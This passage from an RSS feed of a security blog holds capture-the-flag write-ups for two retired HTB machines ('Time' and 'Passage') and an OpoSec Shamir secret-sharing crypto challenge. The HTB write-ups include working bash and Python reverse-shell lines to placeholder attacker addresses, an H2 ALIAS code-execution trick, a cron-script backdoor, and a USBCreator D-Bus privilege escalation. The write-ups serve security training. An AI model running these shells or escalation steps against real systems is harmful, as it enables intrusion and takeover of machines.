]</code></pre><p>This SQL file also abuses an H2 feature - <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">Database ALIAS</a> - to create the reverse shell, as shown below:</p><pre><code class="language-SQL">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
    return s.hasNext() ? s.next() : &quot;&quot;;  }$$;
CALL SHELLEXEC(&apos;bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[attacker-port] 0&gt;&amp;1&apos;)</code></pre><p>And we get a shell as <code>pericles</code>, which in this case also gives us the ability to read the user flag!</p><hr><h2 id="pericles-gets-root">pericles gets root</h2><p>While looking for files that belonged to group <code>pericles</code>, I saw something that caught my eye:</p><pre><code>pericles@time:~$ find / -group pericles

...
/usr/bin/timer_backup.sh
...</code></pre><pre><code>pericles@time:~$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip</code></pre><p>It looks like this script is periodically zipping the <code>/var/www/html</code> directory and then moving the zip file to the <code>root</code> directory.</p><p>This means that the script<em> can</em> access the <code>root</code> directory, which we can abuse by adding an extra line to it that writes the root flag to a directory accessible to our user, such as <code>tmp</code>:</p><pre><code>pericles@time:~$ echo &apos;cat /root/root.txt &gt; /tmp/out&apos; &gt;&gt; /usr/bin/timer_backup.sh

pericles@time:~$ cat  /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
cat /root/root.txt &gt; /tmp/out</code></pre><p>Our <code>root</code> flag is now at <code>/tmp/out</code>.</p><p>And we&apos;re done &#x1F60A;</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Secrets [Crypto]]]></title><description><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That&apos;s easy! - Just implement a very secure, hackerproof&#x2122; secret sharing web application!&quot;<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/03/image-11.png" class="kg-image" alt loading="lazy"></figure><p>Entering random</p>]]></description><link>inesmartins.github.io/oposec-secrets/</link><guid isPermaLink="false">6040b267b4729d033918cd72</guid><category><![CDATA[cryptography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[shamir]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Mar 2021 21:31:29 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1-2.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That&apos;s easy! - Just implement a very secure, hackerproof&#x2122; secret sharing web application!&quot;<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><img src="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1-2.jpeg" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]"><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/03/image-11.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>Entering random data on the input field doesn&apos;t seem to provide us with any interesting information:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/03/image-13.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>Using <a href="https://github.com/xmendez/wfuzz">wfuzz</a> I found a new page:</p><pre><code>~ wfuzz -c --hc 404 -w big.txt https://secret.mbie.me/FUZZ

...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000016081:   200        16 L     42 W       425 Ch      &quot;secret&quot;</code></pre><p>The <a href="https://secret.mbie.me/secret">/secret</a> page displays a message with a link to the <a href="https://secret.mbie.me/getShare">/getShare</a> page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/03/image-3.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>The <a href="https://secret.mbie.me/getShare">/getShare</a> page retrieves a &quot;secret share&quot;, and we can also see from the previous message that <strong>collecting 3 of these</strong> <strong>might be of interest </strong>to us, which points in the direction of some cryptographic attack ...</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/03/image-4.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><hr><h2 id="getting-more-secret-shares">Getting more secret shares</h2><p>After taking a closer look at the GET request to <a href="https://secret.mbie.me/getShare">/getShare</a> we see that we can manipulate the <code>shareholderId</code> value set in the Cookie:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/03/image-5.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>Using <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using">Burp Intruder</a> to brute-force this field, we&apos;re unable to retrieve the secret share of users with <code>shareholderId</code>&apos;s between 1 and 499:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/03/image-7.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>For requests with ID&apos;s above 500 we see the following:</p><pre><code>{&quot;500&quot;:12876858175638.0}
{&quot;501&quot;:12876870698406.0}
{&quot;502&quot;:12876883245936.0}
{&quot;503&quot;:12876895818228.0}
...
{&quot;824&quot;:12882211248882.0} [DEFAULT]
{&quot;825&quot;:12882231794538.0}
{&quot;826&quot;:12882252364956.0}
{&quot;827&quot;:12882272960136.0}
...
{&quot;1000&quot;:12886208619138.0} 
{&quot;1001&quot;:12886233522906.0}
{&quot;1002&quot;:12886258451436.0}
{&quot;1003&quot;:12886283404728.0}
...
infinite</code></pre><p>It wasn&apos;t hard to figure out that as we increment the <code>shareholderId</code> the secret share is equal to the previous shareholder&apos;s secret share plus a difference that increments by <code>24672</code>, which means these secrets are not random data encrypted with any typical key, they&apos;re something else.</p><pre><code>ID    Secret Share        Diff from previous

...
822   12882170231856.0
823   12882190727988.0    +20496132
824   12882211248882.0    +20520894    +24762
825   12882231794538.0    +20545656    +24762
826   12882252364956.0    +20570418    +24762
...</code></pre><hr><h2 id="shamir-s-secret-sharing">Shamir&apos;s Secret Sharing</h2><p>After a bit of googling I ended up stumbling upon this concept of secret sharing: </p><blockquote>(...) a secret is divided into parts, giving each participant its own unique part. To reconstruct the original secret, a minimum number of parts is required. In the threshold scheme this number is less than the total number of parts. Otherwise all participants are needed to reconstruct the original secret.</blockquote><p>In this case, we already know that we only need 3 shares to reconstruct the original secret, from the hint on the /secret page.</p><p>On <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing">the Wikipedia page</a> we can see an example of an implementation of this algorithm in Python, which I adapted to fit the data we&apos;ve already collected:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/03/image-16.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure><p>The result is <code>12873698232138</code> which when we enter as the secret gives us the flag:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/03/image-17.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Secrets [Crypto]" loading="lazy"></figure>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Passage]]></title><description><![CDATA[Write-up for Passage, a retired HTB machine.]]></description><link>inesmartins.github.io/htb-passage/</link><guid isPermaLink="false">5f69aa685c95ba072b855f70</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Mar 2021 12:40:44 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/03/passage.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/275">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sV -sC passage.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News</code></pre><img src="inesmartins.github.io/content/images/2021/03/passage.png" alt="HTB Write-up | Passage"><p>This one is pretty straightforward: </p><ul><li><code>SSH</code> on port 22;</li><li>an <code>Apache</code> web server on port 80.</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2020/09/image-18.png" class="kg-image" alt="HTB Write-up | Passage" loading="lazy"></figure><p>The website was apparently developed using <a href="https://cutephp.com/">CuteNews</a>, a PHP-based news management system. All of the articles look like &quot;Lorem Ipsum&quot; except for <a href="http://passage.htb/index.php?id=11">the first one</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2020/09/image-20.png" class="kg-image" alt="HTB Write-up | Passage" loading="lazy"></figure><p>In fact, all article IDs between 8 and 11 redirect to this article about the implementation of &quot;Fail2Ban&quot;. </p><p>The article&apos;s author is called <code>admin</code>. Their profile link shows us an interesting email: <a href="inesmartins.github.io/p/3c0d4057-391e-4661-a683-f8761c1b8df1/nadav@passage.htb">nadav@passage.htb</a>.</p><p>Looking at the other articles we find the name of 3 other authors:</p><ul><li>Sid Meier</li><li>Kim Swift</li><li>James</li></ul><hr><h2 id="exploiting-cutenews-vulnerabilities">Exploiting CuteNews vulnerabilities</h2><p>After doing a quick search for vulnerabilities on version 2.1.2., I found <a href="https://www.cvedetails.com/cve/CVE-2019-11447/">CVE-2019-11447</a>:</p><blockquote>(...) An attacker can infiltrate the server through the avatar upload process in the profile area via the <code>avatar_file</code> field to <code>index.php?mod=main&amp;opt=personal</code>. <br>There is no effective control of <code>$imgsize</code> in <code>/core/modules/dashboard.php</code>. The header content of a file can be changed and the control can be bypassed for code execution. (An attacker can use the GIF header for this.) [<a href="https://www.cvedetails.com/cve/CVE-2019-11447/">Source</a>]</blockquote><p>I didn&apos;t event have to do any work for this one, since I found a <a href="https://www.exploit-db.com/exploits/48800">working exploit</a>.</p><pre><code>~ python3 cutenews.py

Enter the URL&gt; http://passage.htb
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: ieQ5Hpbxxd and password: ieQ5Hpbxxd

=======================================================
Sending Payload
=======================================================
signature_key: 372b3c37331c51a3d8b0913162391f60-ieQ5Hpbxxd
signature_dsi: 1b2359d409dd82293a1dcea4c28a824b
logged in user: ieQ5Hpbxxd
============================
Dropping to a SHELL
============================

command &gt;</code></pre><p>Et voil&#xE0;! We got a shell! Let&apos;s upgrade it.</p><!--kg-card-begin: markdown--><pre><code>/usr/bin/python -c &apos;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[ATTACKERS_IP]&quot;,[ATTACKERS_PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&apos;
</code></pre>
<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>It looks like we have 2 users on this machine: <code>nadav</code> and <code>paul</code>.</p><pre><code>ls -la /home/
...
drwxr-x--- 17 nadav nadav 4096 Sep 22 03:13 nadav
drwxr-x--- 16 paul  paul  4096 Sep  2 07:18 paul</code></pre><p>Let&apos;s try to crack the hashes we collected on the previous step:</p><pre><code>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</code></pre><p>Using a SHA-256 &quot;<a href="https://md5decrypt.net/en/Sha256/">online decrypter</a>&quot; we immediately find a match for the 3rd one: <code>atlanta1</code>. &#xA0;Let&apos;s see if I can use it with one of the known users:</p><pre><code>www-data@passage:/var/www/html/CuteNews/uploads$ su - paul
su - paul
Password: atlanta1

paul@passage:~$ cat user.txt
03a499ddd51ad76b6e774d536068dcf3</code></pre><p>Second user was a flash. It seems like we can use a private key stored in <code>paul</code>&apos;s <code>.ssh</code> directory to authenticate as <code>nadav</code>:</p><pre><code>paul@passage:~/.ssh$ ls -la
total 24
drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .
drwxr-x--- 17 paul paul 4096 Nov  8 04:55 ..
-rw-r--r--  1 paul paul  948 Nov  8 04:52 authorized_keys
-rw-------  1 paul paul 1679 Jul 21 10:43 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21 10:43 id_rsa.pub
-rw-r--r--  1 paul paul 1312 Jul 21 10:44 known_hosts

paul@passage:~/.ssh$ ssh -i id_rsa nadav@passage.htb
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$</code></pre><p>Let&apos;s set up public key authentication on <code>nadav</code>&apos;s account directly:</p><pre><code>nadav@passage:~/.ssh$ echo &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/dTPIIPRFgRuu8I2qZ/1T6nvmR0T9Z0K627aKq9tWov1MntZGPes6gwzOtMwT2BhnBemGoSaTrquwgOMhALLdeGiFoJKG+kyazLn4NZSe6JNuhqP2E51f0vlBAqHxBMf651ddLs1tVHfhGJH95hw54DDyKXLQFjSQl3jc133HQnH9TIwm/v0xk/3aQUa5tvxfdKD4MpaoYKfV5gqA2yoOjqEImmvzsau0MpJn094eWHNJBU+w0sz8X2+b5tCwHCJajdL1GTcD5rOGke1e5lzUwklAH4m2HJkIw1MFhTuzY1LZbAsa5eSn41O9UeSct9RplocLo1DOHltoc/TReH2ODdb0b9oeEHIYRrMNY65OXAAz9gMA5dyUL2cEfo4O/oQVIJ7SLV2D8g3/FDgBaX1k2zp0ON7UyW3Oh9BBM2oKffiL7hN9X2ltjj3tcuzhh4qR2spOPIMwpUyS1aJnyh7+LNvaQ4QqSZR6TTzkBSS13nKRnEwPzbh6HFlfuaTSQJ0=&apos; &gt;&gt; /.ssh/authorized_keys</code></pre><p>Now we can simply <code>SSH</code> as <code>nadav</code>:</p><pre><code>~ ssh -i id_rsa nadav@passage.htb
Last login: Sun Nov  8 04:56:41 2020 from 127.0.0.1
nadav@passage:~$</code></pre><hr><h2 id="getting-root">Getting root</h2><p>After not getting anything of relevance from the normal enumeration process, I turned to some local files to try and find some clues:</p><pre><code>nadav@passage:~$ cat .viminfo
...

# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
&apos;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&apos;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-&apos;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&apos;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-&apos;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-&apos;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	&quot;	12	7

&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	&quot;	2	0
	.	2	0
	+	2	0</code></pre><p>So it seems like <code>nadav</code> has replaced <code>AdminIdentities=unix-group:root</code> with <code>AdminIdentities=unix-group:sudo</code>, in a couple of files:</p><ul><li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li><li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li></ul><p>This is very interesting because <code>nadav</code> belongs to the <code>sudoer</code> group.</p><p>After looking around for some priv esc vulnerabilities related to <code>USBCreator</code> I stumbled upon <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">this</a> article:</p><blockquote>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root &#x2013; without supplying a password. [<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">Source</a>]</blockquote><p>Following that article, I used <code>gdbus</code> to copy the flag from its original location to an accessible directory and then read the accessible file:</p><pre><code>~ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag.txt true
()

~ cat /tmp/flag.txt</code></pre><hr>]]></content:encoded></item></channel></rss>